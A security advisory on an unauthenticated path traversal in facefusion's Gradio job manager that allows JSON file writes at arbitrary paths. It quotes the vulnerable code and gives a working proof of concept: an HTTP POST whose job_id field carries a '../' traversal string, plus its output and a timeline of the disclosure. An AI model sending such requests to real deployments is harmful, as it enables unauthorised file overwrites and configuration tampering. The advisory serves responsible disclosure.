https://github.com/facefusion/facefusion/

## Finding: Unauthenticated Path Traversal via job_id in Job Manager API Allows Arbitrary File Write

### Summary

The facefusion job manager accepts a user-supplied `job_id` string and constructs a file path by joining it with the jobs directory without sanitizing path traversal sequences. Sending a `job_id` value such as `../../etc/evil` causes facefusion to write a JSON file outside the intended jobs directory, reaching any location writable by the server process. The Gradio UI exposes this functionality unauthenticated by default via the `/gradio_api/run/` HTTP endpoint.

### Details

The root cause is in `facefusion/jobs/job_manager.py`. The function `suggest_job_path` builds the file path as:

```python
# facefusion/jobs/job_manager.py, line 241-245
def suggest_job_path(job_id : str, job_status : JobStatus) -> Optional[str]:
    job_file_name = get_job_file_name(job_id)  # just appends ".json", no sanitization
    if job_file_name:
        return os.path.join(JOBS_PATH, job_status, job_file_name)
    return None
```

`get_job_file_name` (line 262) simply returns `job_id + '.json'` with no normalization. `os.path.join` does not resolve dotdot sequences. The resulting path is passed directly to `write_json`:

```python
# facefusion/jobs/job_manager.py, line 211-218
def create_job_file(job_id : str, job : Job) -> bool:
    job_path = find_job_path(job_id)
    if not is_file(job_path):
        job_create_path = suggest_job_path(job_id, 'drafted')
        return write_json(job_create_path, job)  # writes to traversal path
    return False
```

```python
# facefusion/json.py, line 16-20
def write_json(json_path : str, content : Content) -> bool:
    with open(json_path, 'w') as json_file:  # no path check, opens anywhere
        json.dump(content, json_file, indent = 4)
    return is_file(json_path)
```

The CLI sanitizes `job_id` via `sanitize_job_id` registered as an argparse type (program.py line 271). The Gradio UI does not apply this sanitizer: `facefusion/uis/components/job_manager.py` passes the raw textbox value directly to `job_manager.create_job(created_job_id)` with no sanitization call.

The in_directory guard in `resolve_file_pattern` is not applied during write -- it is only used during the pre-existence check (find_job_path), and `os.path.isdir` correctly resolves dotdot sequences, so the guard passes for traversal paths whose resolved parent directory exists.

The Gradio web interface launches with no authentication by default (no `auth=` parameter in any `ui.launch()` call across all layout files). The `/gradio_api/run/<api_name>` endpoint is reachable by any HTTP client on the network.

CodeQL flagged `py/path-injection` at `facefusion/json.py:12` and `json.py:20` (read and write paths) as user-controlled path sinks.

### PoC

Prerequisites: facefusion running in default mode (Gradio UI on port 7860; no auth configured). JOBS_PATH defaults to `.jobs` relative to the working directory.

1. Start facefusion:

```
python facefusion.py run --ui-layouts default
```

2. Identify JOBS_PATH (defaults to `.jobs` inside the working directory). Adjust the number of `../` segments to escape to the desired target directory.

3. Send an HTTP POST to the Gradio queue endpoint to create a job with a traversal job_id:

```
POST /gradio_api/run/apply HTTP/1.1
Host: <facefusion-host>:7860
Content-Type: application/json

{
  "data": [
    "job-create",
    "../../../../../../tmp/attacker_owned",
    "none",
    "none"
  ]
}
```

This writes a valid JSON file at `/tmp/attacker_owned.json` outside the `.jobs` directory.

4. The response is HTTP 200 and the file exists at the traversal target:

```
$ ls -la /tmp/attacker_owned.json
-rw-rw-r-- 1 runner runner 121 2026-06-02 12:44 /tmp/attacker_owned.json
$ cat /tmp/attacker_owned.json
{
    "version": "1",
    "date_created": "2026-06-02T12:44:40.989363+08:00",
    "date_updated": null,
    "steps": []
}
```

Live validation was performed on commit 5b7d145 using the facefusion job_manager code path via Gradio 5.44.1. Results:

- `job_id = "../../ff_gradio_rce_poc"` wrote `/tmp/ff_gradio_rce_poc.json` (confirmed via HTTP 200 from `/gradio_api/run/create_job`)
- `job_id = "../../../../<home>/ff_traversal_demo"` wrote `ff_traversal_demo.json` in the user home directory (confirmed)

Both returned HTTP 200 from the unauthenticated `/gradio_api/run/` endpoint.

After the file is created via `create_job`, subsequent `add_step` calls (also accessible via the API) write attacker-controlled JSON content (source paths, output paths, processor arguments) into the traversal file via `update_job_file`, enabling controlled JSON content injection at arbitrary paths.

### Impact

Any network client can write JSON files to arbitrary filesystem paths accessible to the facefusion process, with no authentication required. Specifically:

- An attacker can overwrite existing `.json` configuration files used by other services on the host (cron definitions, application configs stored as JSON, package.json, etc.), causing denial of service or configuration corruption.
- With `add_step`, the attacker controls the JSON content written to the traversal file, enabling injection of attacker-chosen values into any JSON file the process can write.
- If facefusion runs as a privileged user (common in Docker containers running as root), the attacker can write to system directories.
- The attack requires no credentials, no user interaction, and no special headers beyond a standard HTTP POST.

Affected version: commit 5b7d145 (v3.6.1)

## Disclosure
 - 2 June 2026 - reported via https://github.com/facefusion/facefusion/security/advisories/GHSA-4924-5xp4-fmmf
 - 2 June 2026 - reported accepted
 - 2 June 2026 - fix intended to be released in 3.7.0 the following week
 - 27 June 2026 - fix released, GHSA requested CVE but closed instead of publish:

<img width="1002" height="786" alt="image" src="https://github.com/user-attachments/assets/f38947bb-eea3-4261-92d6-589ce757bd29" />
